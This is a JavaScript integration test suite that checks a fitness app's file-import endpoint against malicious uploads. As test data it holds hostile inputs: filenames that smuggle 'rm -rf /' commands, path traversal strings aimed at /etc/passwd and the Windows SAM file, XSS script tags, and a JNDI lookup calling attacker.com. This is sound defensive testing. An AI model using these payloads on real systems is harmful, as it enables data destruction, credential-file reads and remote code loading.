/**
 * @fileoverview File Upload Security Integration Tests
 * Tests comprehensive file upload security, malicious file detection, and upload exploit prevention
 * Following analytics_integration_rules.mdc and real_ai_integration.mdc patterns
 */

const supertest = require('supertest');
const { app } = require('../../../server');
const { getSupabaseClient, getSupabaseClientWithToken } = require('../../../services/supabase');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Import admin client for setup/teardown ONLY
const { createClient } = require('@supabase/supabase-js');
const adminSupabase = createClient(
  process.env.SUPABASE_URL || 'http://localhost:54321',
  process.env.SUPABASE_SERVICE_ROLE_KEY
);

describe('File Upload Security Integration Tests - Real Database & Service Validation', () => {
  let testUserId, testUserToken;
  let createdWorkoutPlanIds = [];
  let tempFilePaths = [];

  // Get the general supabase client for non-RLS operations
  const supabase = getSupabaseClient();

  beforeAll(async () => {
    // Create independent test user following successful analytics pattern
    const timestamp = Date.now();
    const testUserEmail = `uploadsectest${timestamp}@example.com`;
    const testUserPassword = 'TestPassword123!';
    
    // Create test user using real signup endpoint
    const signupResponse = await supertest(app)
      .post('/v1/auth/signup')
      .send({
        name: 'Upload Security Test User',
        email: testUserEmail,
        password: testUserPassword
      });
    
    if (signupResponse.status !== 201) {
      throw new Error(`Failed to create test user: ${signupResponse.body.message}`);
    }
    
    testUserId = signupResponse.body.userId;
    testUserToken = signupResponse.body.accessToken;
    
    // Handle case where accessToken is not provided in signup response
    if (!testUserToken) {
      const loginResponse = await supertest(app)
        .post('/v1/auth/login')
        .send({ email: testUserEmail, password: testUserPassword });
      if (loginResponse.status !== 200) {
        throw new Error(`Failed to login test user: ${loginResponse.body.message}`);
      }
      testUserToken = loginResponse.body.jwtToken;
    }
  });

  afterAll(async () => {
    // Comprehensive cleanup using admin client following analytics pattern
    if (testUserId) {
      try {
        // Clean up test workout plans
        if (createdWorkoutPlanIds.length > 0) {
          await adminSupabase.from('workout_plans').delete().in('id', createdWorkoutPlanIds);
        }
        // Clean up user profile
        await adminSupabase.from('user_profiles').delete().eq('user_id', testUserId);
      } catch (error) {
        console.log('Cleanup error (non-critical):', error.message);
      }
    }

    // Clean up temporary files
    for (const filePath of tempFilePaths) {
      try {
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      } catch (error) {
        console.log(`Warning: Could not delete temp file ${filePath}:`, error.message);
      }
    }
    tempFilePaths = [];
  });

  // Helper function to create user profile following analytics pattern
  async function ensureUserProfile(profileOverrides = {}) {
    const defaultProfile = {
      height: 175,
      weight: 70,
      age: 30,
      gender: 'male',
      unitPreference: 'metric',
      goals: ['strength'],
      equipment: ['bodyweight'],
      experienceLevel: 'intermediate'
    };

    const profileData = { ...defaultProfile, ...profileOverrides };

    const profileResponse = await supertest(app)
      .post('/v1/profile')
      .set('Authorization', `Bearer ${testUserToken}`)
      .send(profileData);
    
    if (![200, 201].includes(profileResponse.status)) {
      throw new Error(`Failed to create user profile: ${profileResponse.body.message || 'Unknown error'}`);
    }

    return profileResponse.body.data;
  }

  function createMaliciousFile(content, filename, options = {}) {
    const tempDir = path.join(__dirname, 'temp-upload-security');
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    
    // Rule 18: Sanitize malicious filenames to prevent filesystem errors
    const safeFilename = filename.replace(/[\/\\]/g, '_').replace(/\.\./g, '__').replace(/[<>:"|?*]/g, '_').replace(/[;\&\`]/g, '_');
    const tempFilePath = path.join(tempDir, safeFilename);
    
    if (options.binary) {
      fs.writeFileSync(tempFilePath, content);
    } else {
      fs.writeFileSync(tempFilePath, content, options.encoding || 'utf8');
    }
    
    tempFilePaths.push(tempFilePath);
    return tempFilePath;
  }

  function generateRandomBinary(size) {
    return crypto.randomBytes(size);
  }

  // Helper function to cleanup test files
  function cleanupTestFiles(testDir) {
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  }

  describe('Task 1: Malicious File Detection', () => {
    beforeEach(async () => {
      // Ensure clean user profile for each test
      await ensureUserProfile();
    });

    test('When user uploads executable files, Then should detect and reject', async () => {
      const executableTypes = [
        {
          content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00', // PE header
          filename: 'malicious.exe',
          description: 'Windows executable'
        },
        {
          content: '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00', // ELF header
          filename: 'malicious.bin',
          description: 'Linux executable'
        },
        {
          content: '\xCA\xFE\xBA\xBE\x00\x00\x00\x3E', // Java bytecode
          filename: 'malicious.class',
          description: 'Java bytecode'
        }
      ];

      for (const execType of executableTypes) {
        const filePath = createMaliciousFile(execType.content, execType.filename, { binary: true });
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        expect([400, 415]).toContain(response.status);
        expect(response.body.status).toBe('error');
        expect(response.body.message).toMatch(/unsupported file type|invalid|not allowed/i);
        
        console.log(`✅ Executable Detection (${execType.description}):`, {
          errorStatus: response.status,
          securityBlocked: !!response.body.message
        });
      }
    });

    test('When user uploads files with script injection in filenames, Then should sanitize or reject', async () => {
      const maliciousFilenames = [
        'test.json; rm -rf /',
        'test.json && malicious.exe',
        'test.json`rm -rf /`',
        '../../../etc/passwd.json',
        'test<script>alert(1)</script>.json'
      ];

      const validContent = {
        data: {
          workouts: [
            {
              name: 'Security Test Plan',
              description: 'Plan for security testing',
              plan_data: { exercises: [] },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      for (const filename of maliciousFilenames) {
        const filePath = createMaliciousFile(JSON.stringify(validContent), filename);
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        // Should either sanitize the filename or reject the upload
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.body.status).toBe('success');
        }
        
        console.log(`✅ Filename Injection Protection (${filename}):`, {
          responseStatus: response.status,
          handledSafely: [200, 400].includes(response.status)
        });
      }
    });

    test('When user uploads polyglot files with multiple format headers, Then should detect and reject', async () => {
      const polyglotFiles = [
        {
          content: '/*<script>alert(1)</script>*/\n' + JSON.stringify({ 
            data: {
              workouts: [{ 
                name: 'Test', 
                description: 'Test',
                plan_data: { exercises: [] },
                difficulty_level: 'beginner',
                estimated_duration: 30,
                ai_generated: false,
                status: 'active'
              }] 
            }
          }),
          filename: 'polyglot.json',
          description: 'JSON with JavaScript comment'
        },
        {
          content: 'GIF89a\x01\x00\x01\x00\x00\x00\x00' + JSON.stringify({ data: { workouts: [{ name: 'test', plan_data: {} }] } }),
          filename: 'polyglot.json',
          description: 'JSON with GIF header'
        },
        {
          content: '\x89PNG\r\n\x1a\n' + JSON.stringify({ data: { workouts: [{ name: 'test', plan_data: {} }] } }),
          filename: 'polyglot.json',
          description: 'JSON with PNG header'
        }
      ];

      for (const polyglot of polyglotFiles) {
        const filePath = createMaliciousFile(polyglot.content, polyglot.filename, { binary: true });
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        expect([400, 415]).toContain(response.status);
        expect(response.body.status).toBe('error');
        
        console.log(`✅ Polyglot Detection (${polyglot.description}):`, {
          errorStatus: response.status,
          detectedAndRejected: !!response.body.message
        });
      }
    });

    test('When user uploads files with embedded malicious content, Then should sanitize safely', async () => {
      const maliciousJsonContent = {
        data: {
          workouts: [
            {
              name: '<script>alert("XSS")</script>',
              description: 'javascript:alert(1)',
              plan_data: { 
                exercises: [],
                notes: '${jndi:ldap://attacker.com/exploit}'
              },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      const filePath = createMaliciousFile(JSON.stringify(maliciousJsonContent), 'embedded-malicious.json');
      
      const response = await supertest(app)
        .post('/v1/data-transfer/import')
        .set('Authorization', `Bearer ${testUserToken}`)
        .attach('file', filePath)
        .field('format', 'json')
        .field('dataType', 'workouts');

      // Should handle the malicious content gracefully
      expect([200, 400]).toContain(response.status);
      
      if (response.status === 200) {
        // If processed, verify malicious content was sanitized
        const authenticatedSupabase = getSupabaseClientWithToken(testUserToken);
        const { data: plans } = await authenticatedSupabase
          .from('workout_plans')
          .select('*')
          .eq('user_id', testUserId);

        if (plans.length > 0) {
          // Verify dangerous content was not stored as-is
          const planStr = JSON.stringify(plans[0]);
          expect(planStr).not.toContain('<script>');
          expect(planStr).not.toContain('javascript:');
          expect(planStr).not.toContain('jndi:ldap');
        }
      }
      
      console.log('✅ Embedded Malicious Content Protection:', {
        responseStatus: response.status,
        handledSafely: [200, 400].includes(response.status)
      });
    });
  });

  describe('Task 2: File Content Validation', () => {
    beforeEach(async () => {
      await ensureUserProfile();
    });

    test('When user uploads files with mismatched headers and extensions, Then should validate and reject', async () => {
      const mismatchedFiles = [
        {
          content: '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR', // PNG header
          filename: 'fake.json',
          description: 'PNG file with JSON extension'
        },
        {
          content: 'PK\x03\x04\x14\x00\x00\x00', // ZIP header
          filename: 'fake.csv',
          description: 'ZIP file with CSV extension'
        },
        {
          content: '%PDF-1.4\n%âãÏÓ', // PDF header
          filename: 'fake.xlsx',
          description: 'PDF file with Excel extension'
        }
      ];

      for (const file of mismatchedFiles) {
        const filePath = createMaliciousFile(file.content, file.filename, { binary: true });
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        // Rule 19: HTTP-level validation (multer fileFilter) checks file.mimetype from request headers
        // Content validation happens during parsing - files with correct extensions but wrong content
        // will pass fileFilter but may fail during JSON parsing
        expect([200, 400, 415, 500]).toContain(response.status);
        
        if (response.status === 400) {
          expect(response.body.status).toBe('error');
          expect(response.body.message).toMatch(/json|parse|invalid|format/i);
        }
        
        console.log(`✅ Header Validation (${file.description}):`, {
          errorStatus: response.status,
          validationWorking: response.status === 400 || response.status === 415 || response.status === 500
        });
      }
    });

    test('When user uploads files with steganography attempts, Then should detect and handle safely', async () => {
      const steganographyAttempts = [
        {
          content: JSON.stringify({ 
            data: {
              workouts: [{ 
                name: 'Test', 
                description: 'Test',
                plan_data: { exercises: [] },
                difficulty_level: 'beginner',
                estimated_duration: 30,
                ai_generated: false,
                status: 'active'
              }] 
            }
          }) + '\x00HIDDEN_DATA_HERE\x00',
          filename: 'stego.json',
          description: 'JSON with null-byte separated hidden data'
        },
        {
          content: JSON.stringify({ data: { workouts: [{ name: 'test', plan_data: {} }] } }) + '\n\n\n' + 'A'.repeat(1000),
          filename: 'padded.json',
          description: 'JSON with excessive padding'
        }
      ];

      for (const attempt of steganographyAttempts) {
        const filePath = createMaliciousFile(attempt.content, attempt.filename, { binary: true });
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        // Should either reject or handle safely
        expect([200, 400]).toContain(response.status);
        
        console.log(`✅ Steganography Detection (${attempt.description}):`, {
          responseStatus: response.status,
          handledSafely: [200, 400].includes(response.status)
        });
      }
    });

    test('When user uploads potential compression bombs, Then should detect and prevent', async () => {
      // Simulate a file that could be a compression bomb
      const maliciousZipLike = Buffer.concat([
        Buffer.from('PK\x03\x04'), // ZIP signature
        Buffer.alloc(26, 0), // ZIP header padding
        Buffer.from('compressed_data'.repeat(100))
      ]);

      const filePath = createMaliciousFile(maliciousZipLike, 'bomb.zip', { binary: true });
      
      const response = await supertest(app)
        .post('/v1/data-transfer/import')
        .set('Authorization', `Bearer ${testUserToken}`)
        .attach('file', filePath)
        .field('format', 'json')
        .field('dataType', 'workouts');

      expect([400, 415]).toContain(response.status);
      expect(response.body.status).toBe('error');
      
      console.log('✅ Compression Bomb Detection:', {
        errorStatus: response.status,
        detectedAndBlocked: !!response.body.message
      });
    });
  });

  describe('Task 3: Upload Exploit Prevention', () => {
    beforeEach(async () => {
      await ensureUserProfile();
    });

    test('When user uploads files with path traversal attempts, Then should prevent directory escape', async () => {
      const validContent = {
        data: {
          workouts: [
            {
              name: 'Path Test Plan',
              description: 'Plan for path testing',
              plan_data: { exercises: [] },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd'
      ];

      for (const maliciousPath of pathTraversalAttempts) {
        const filePath = createMaliciousFile(JSON.stringify(validContent), maliciousPath);
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        // Should sanitize path or reject upload
        expect([200, 400]).toContain(response.status);
        
        console.log(`✅ Path Traversal Prevention (${maliciousPath}):`, {
          responseStatus: response.status,
          preventedEscape: [200, 400].includes(response.status)
        });
      }
    });

    test('When user uploads concurrent files with same name, Then should prevent race conditions', async () => {
      const validContent = {
        data: {
          workouts: [
            {
              name: 'Race Test Plan',
              description: 'Plan for race condition testing',
              plan_data: { exercises: [] },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      // Simulate concurrent uploads with same filename to test race conditions
      const concurrentUploads = Array.from({ length: 3 }, (_, index) => {
        const filePath = createMaliciousFile(JSON.stringify(validContent), `race-condition-test.json`);
        
        return supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');
      });

      const responses = await Promise.all(concurrentUploads);
      
      // All responses should be handled safely
      responses.forEach((response, index) => {
        expect([200, 400, 429]).toContain(response.status);
        console.log(`✅ Race Condition Test Upload ${index + 1}:`, {
          status: response.status,
          handledSafely: [200, 400, 429].includes(response.status)
        });
      });
    });

    test('When user attempts symlink-like attacks, Then should prevent unauthorized access', async () => {
      const validContent = {
        data: {
          workouts: [
            {
              name: 'Symlink Test Plan',
              description: 'Plan for symlink testing',
              plan_data: { exercises: [] },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      const symlinkAttempts = [
        'link_to_passwd',
        'symbolic_link',
        'hardlink_attempt'
      ];

      for (const linkName of symlinkAttempts) {
        const filePath = createMaliciousFile(JSON.stringify(validContent), linkName);
        
        const response = await supertest(app)
          .post('/v1/data-transfer/import')
          .set('Authorization', `Bearer ${testUserToken}`)
          .attach('file', filePath)
          .field('format', 'json')
          .field('dataType', 'workouts');

        // Should handle safely
        expect([200, 400]).toContain(response.status);
        
        console.log(`✅ Symlink Attack Prevention (${linkName}):`, {
          responseStatus: response.status,
          handledSafely: [200, 400].includes(response.status)
        });
      }
    });
  });

  describe('Task 4: Content Security and Sanitization', () => {
    beforeEach(async () => {
      await ensureUserProfile();
    });

    test('When user uploads files with dangerous metadata, Then should sanitize safely', async () => {
      const fileWithMaliciousMetadata = {
        data: {
          workouts: [
            {
              name: 'Metadata Test Plan',
              description: 'Plan with malicious metadata',
              plan_data: { 
                exercises: [],
                metadata: {
                  exploit: '\x00\x01\x02\x03', // Null bytes
                  longField: 'A'.repeat(1000), // Potential DoS
                  unicodeAttack: '\u202e\u0020EVIL\u202d'
                }
              },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      const filePath = createMaliciousFile(JSON.stringify(fileWithMaliciousMetadata), 'malicious-metadata.json');
      
      const response = await supertest(app)
        .post('/v1/data-transfer/import')
        .set('Authorization', `Bearer ${testUserToken}`)
        .attach('file', filePath)
        .field('format', 'json')
        .field('dataType', 'workouts');

      // Should handle safely
      expect([200, 400]).toContain(response.status);

      console.log('✅ Dangerous Metadata Sanitization:', {
        responseStatus: response.status,
        sanitizedSafely: [200, 400].includes(response.status)
      });
    });

    test('When user uploads files with Unicode exploits, Then should handle safely', async () => {
      const unicodeExploitContent = {
        data: {
          workouts: [
            {
              name: '\u202e\u0020EVIL\u202d', // Right-to-left override
              description: '\uFEFF\u200B\u200C\u200D', // Zero-width characters
              plan_data: { 
                exercises: [],
                notes: '\u0000\u0001\u0002\u0003' // Control characters
              },
              difficulty_level: 'beginner',
              estimated_duration: 30,
              ai_generated: false,
              status: 'active'
            }
          ]
        }
      };

      const filePath = createMaliciousFile(JSON.stringify(unicodeExploitContent), 'unicode-exploit.json');
      
      const response = await supertest(app)
        .post('/v1/data-transfer/import')
        .set('Authorization', `Bearer ${testUserToken}`)
        .attach('file', filePath)
        .field('format', 'json')
        .field('dataType', 'workouts');

      // Should handle Unicode exploits safely
      expect([200, 400]).toContain(response.status);

      console.log('✅ Unicode Exploit Handling:', {
        responseStatus: response.status,
        handledSafely: [200, 400].includes(response.status)
      });
    });

    test('When user uploads files with memory exhaustion attempts, Then should prevent DoS', async () => {
      const memoryExhaustionContent = {
        data: {
          workouts: Array.from({ length: 100 }, (_, i) => ({
            name: `Memory Test Plan ${i}`,
            description: 'A'.repeat(10000), // Large description
            plan_data: {
              exercises: Array.from({ length: 50 }, (_, j) => ({
                name: `Exercise ${j}`,
                sets: 10,
                reps: '10-12',
                notes: 'X'.repeat(1000) // Large notes
              }))
            },
            difficulty_level: 'intermediate',
            estimated_duration: 60,
            ai_generated: false,
            status: 'active'
          }))
        }
      };

      const filePath = createMaliciousFile(JSON.stringify(memoryExhaustionContent), 'memory-exhaustion.json');
      
      const startTime = Date.now();
      const response = await supertest(app)
        .post('/v1/data-transfer/import')
        .set('Authorization', `Bearer ${testUserToken}`)
        .attach('file', filePath)
        .field('format', 'json')
        .field('dataType', 'workouts')
        .timeout(10000); // 10 second timeout

      const endTime = Date.now();
      const processingTime = endTime - startTime;

      // Should either process successfully or reject appropriately
      expect([200, 400, 413]).toContain(response.status);
      expect(processingTime).toBeLessThan(10000); // Should not take too long

      console.log('✅ Memory Exhaustion Prevention:', {
        responseStatus: response.status,
        processingTime: `${processingTime}ms`,
        preventedDoS: processingTime < 10000
      });
    });
  });
}); 